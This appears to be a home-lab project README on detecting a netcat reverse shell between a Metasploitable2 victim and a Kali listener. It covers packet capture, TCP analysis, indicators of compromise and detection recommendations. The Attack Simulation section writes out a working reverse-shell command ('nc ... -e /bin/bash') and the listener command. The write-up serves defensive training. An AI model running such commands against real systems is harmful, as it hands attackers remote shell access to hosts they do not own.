# Project 4 — Reverse Shell Network Detection

![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange)
![Tools](https://img.shields.io/badge/Tools-Kali%20%7C%20Netcat%20%7C%20Wireshark%20%7C%20tcpdump-red)

## 🎯 Objective

Simulate a reverse shell connection from Metasploitable2 back to Kali Linux, capture the resulting traffic using both live (Wireshark) and offline (tcpdump) methods, and analyze the packet-level indicators that distinguish this activity from normal network traffic.

---

## 🧠 What is a Reverse Shell?

A reverse shell inverts the normal client-server relationship. Instead of an attacker connecting **into** a victim machine (like SSH), the compromised host initiates an **outbound** connection back to the attacker, handing over an interactive shell.

This technique is common in real intrusions because most networks and firewalls are configured to restrict inbound connections far more heavily than outbound ones — a reverse shell slips past that restriction by having the victim "call home" instead.

**Why it matters:** Once an attacker gains code execution on a host (via any exploit), a reverse shell is often the very next step to establish hands-on-keyboard access. Recognizing this traffic pattern at the network level is a core blue-team skill, especially when host-based logging is incomplete or absent.

---

## 🖥️ Lab Environment

| Component | Details |
|-----------|---------|
| Attacker (listener) | Kali Linux (192.168.248.3) |
| Target (victim) | Metasploitable2 (192.168.248.4) |
| Network | Host-Only Adapter (192.168.248.0/24) |
| Shell Tool | Netcat |
| Capture Tools | Wireshark (live), tcpdump (offline) |
| Listener Port | 4444/TCP |

---

## ⚔️ Attack Simulation

### Phase 1: Connectivity Check
Verified both VMs could reach each other before simulating the attack:
```bash
ping -c 3 192.168.248.3
```
**Result:**
```
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 1.996/4.658/9.810/3.644 ms
```

### Phase 2: Start the Listener
On Kali (attacker), opened a listener waiting for the callback connection:
```bash
nc -lvp 4444
```
```
listening on [any] 4444 ...
```

### Phase 3: Trigger the Reverse Shell
On Metasploitable2 (target), initiated the outbound connection back to Kali:
```bash
nc 192.168.248.3 4444 -e /bin/bash
```

**Command breakdown:**
| Flag | Meaning |
|------|---------|
| `192.168.248.3` | Attacker's IP to connect back to |
| `4444` | Attacker's listening port |
| `-e /bin/bash` | Executes bash and pipes it through the connection |

### Phase 4: Confirm Interactive Access
Commands typed into Kali's listener executed on Metasploitable2 and returned output:
```bash
whoami
```
```
msfadmin
```
```bash
id
```
```
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
```

**Attack Result:** Fully interactive reverse shell established, confirmed via remote command execution

---

## 🔍 Detection & Packet Analysis

### Capture Method A — Live (Wireshark)
Wireshark was started on Kali's `eth0` interface **before** triggering the shell, ensuring the full TCP handshake was captured. Traffic was isolated with:
```
ip.addr == 192.168.248.4
```

### Capture Method B — Offline (tcpdump)
```bash
sudo tcpdump -i eth0 -w reverse_shell.pcap
```
**Result:**
```
21 packets captured
21 packets received by filter
0 packets dropped by kernel
```
The resulting `.pcap` was opened afterward in Wireshark (`wireshark reverse_shell.pcap`), producing the same handshake and data pattern as the live capture — confirming tcpdump as a reliable, scriptable alternative for headless systems or repeatable evidence collection.

### Packet-Level Breakdown

| Stage | Source → Dest | Protocol | Interpretation |
|-------|---------------|----------|----------------|
| Handshake | `.4 → .3` | TCP `[SYN]` | Metasploitable2 initiates connection to Kali on port 4444 |
| Handshake | `.3 → .4` | TCP `[SYN, ACK]` | Kali (listener) accepts |
| Handshake | `.4 → .3` | TCP `[ACK]` | Connection established |
| Data | `.3 → .4` | TCP `[PSH, ACK]` | Kali sends typed command (e.g. `whoami`) |
| Data | `.4 → .3` | TCP `[ACK]` | Metasploitable2 acknowledges |
| Data | `.4 → .3` | TCP `[PSH, ACK]` | Metasploitable2 pushes command output back |

### Query Equivalent: What We're Looking For

Since this lab's current Splunk pipeline doesn't yet ingest connection-level telemetry, detection here was performed directly at the packet level rather than via SPL. The network-layer equivalent of a detection query would be:

```
Outbound connection from internal host
  → to unregistered high port (4444)
  → with no preceding DNS resolution
  → sustained bidirectional PSH/ACK traffic
= Reverse shell signature
```

---

## 🚩 Indicators of Compromise (IOCs)

**1. Connection direction.**
The victim (`.4`) initiated the outbound connection to the attacker (`.3`) — the reverse of a legitimate service model, where clients connect *into* a server. This is the single strongest network-layer signal.

**2. Unregistered destination port, no DNS lookup.**
Port `4444` is not a standard service port. Kali's terminal explicitly logged `inverse host lookup failed: Unknown host` — legitimate traffic is almost always preceded by name resolution; this connection had none.

**3. Traffic shape.**
Small, irregularly-timed PSH/ACK exchanges reflected human typing cadence rather than an automated process or bulk transfer — a recognizable signature of an interactive shell session.

**4. Plaintext content.**
Because netcat provides no encryption, typed commands and output (`whoami`, `id`) were visible in cleartext within the TCP stream — providing direct, reconstructable evidence for an incident report.

### Baseline Traffic Excluded from Analysis

| Traffic Type | Source | Explanation |
|---|---|---|
| DHCP | 192.168.248.2 ↔ .3 | VirtualBox host-only DHCP server issuing/renewing IP leases — normal housekeeping |
| ARP | Broadcast | Standard IP-to-MAC resolution preceding new connections — expected on any LAN |

Both were identified and excluded as expected background activity, isolating analysis to the relevant port 4444 traffic.

---

## 📸 Screenshots

| Screenshot | Description |
|------------|-------------|
| `wireshark-live-capture.png` | Live capture showing TCP handshake between .3 and .4 |
| `netcat-shell-confirmed.png` | `whoami`/`id` output confirming interactive shell |
| `tcpdump-packet-count.png` | tcpdump summary — 21 packets captured, 0 dropped |
| `wireshark-pcap-reopened.png` | Offline `.pcap` reopened in Wireshark for analysis |

---

## 🧠 Key Concepts Learned

**Reverse Shell Traffic Pattern**
Unlike normal services where clients connect into a server, a reverse shell has the *compromised* host reach *out* to the attacker. This single directional flip is the most reliable network-based indicator, regardless of what port or protocol is used to disguise it.

**Live vs. Offline Packet Capture**
Wireshark's live GUI capture is intuitive for learning, but tcpdump's file-based workflow (`-w file.pcap`) is what's actually used in production — it's scriptable, works on headless systems, and produces portable evidence that can be reopened and reanalyzed anywhere, including in Wireshark itself.

**Why Capture Timing Matters**
Starting the capture *before* triggering the shell was essential — packets aren't retroactively visible once they've crossed the wire. Missing the initial SYN/SYN-ACK/ACK handshake would mean losing the clearest evidence of connection direction.

**Encrypted vs. Unencrypted Shells**
Because netcat sends everything in plaintext, the full command/response conversation could be read directly from the capture. A real attacker using an encrypted C2 channel wouldn't expose content this way — but the *connection metadata* (direction, port, timing, lack of DNS) would still be visible and still be the basis for detection, even without decrypting payload content.

---

## ⚠️ Issues Faced & Fixed

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| Kali VM freezing repeatedly during capture | Insufficient RAM allocated (2048 MB) for GUI + Wireshark while Splunk ran on host | Increased Kali's base memory to 4096 MB and stopped the Splunk service on the host during capture |
| Uncertain which VM to run tcpdump on | Confusion over capture vantage point | Clarified that capture should run on Kali (attacker/listener side) to stay consistent with the earlier live Wireshark session for direct comparison |
| No visible packets until capture started | Live capture confused with retroactive logging | Confirmed packet capture only sees traffic occurring *after* it starts — capture must be running before the shell is triggered |

---

## 📈 Detection Quality Assessment

| Metric | Value |
|--------|-------|
| Packets Captured (tcpdump) | 21 |
| Packets Dropped | 0 |
| Handshake Captured | Yes (SYN, SYN-ACK, ACK) |
| Commands Reconstructed | `whoami`, `id` |
| False Positives | 0 (isolated via `ip.addr` filter, ARP/DHCP excluded) |
| Detection Method | Manual packet analysis (network-layer telemetry only — no SIEM ingestion yet) |

---

## 🔧 Recommended Improvements

Metasploitable2's default logging doesn't clearly surface this activity at the host level, and this lab's current Splunk pipeline (rsyslog → UDP 514) doesn't yet capture connection-level telemetry. To close that gap in a production-style environment:

- **Network-layer (NIDS/Zeek):** Alert on outbound connections to non-standard high ports with no preceding DNS query.
- **Host-layer (auditd):** Log `execve` calls for `/bin/bash`, `nc`, or similar shell-spawning binaries, forwarded via rsyslog — to catch the local half of the reverse shell that pure packet capture can't see.
- **Splunk (once relevant logs are ingested):** Alert on connection duration + low-and-bursty byte patterns to a single destination IP/port, distinguishing interactive shells from normal application traffic.

---

## ➡️ Next Project

[Project 5 — End-to-End SOC Investigation Simulation](../Project-4-SOC-Investigation/)

Chain together a full attack (exploitation → reverse shell → persistence) and build a complete incident timeline using both host and network evidence.
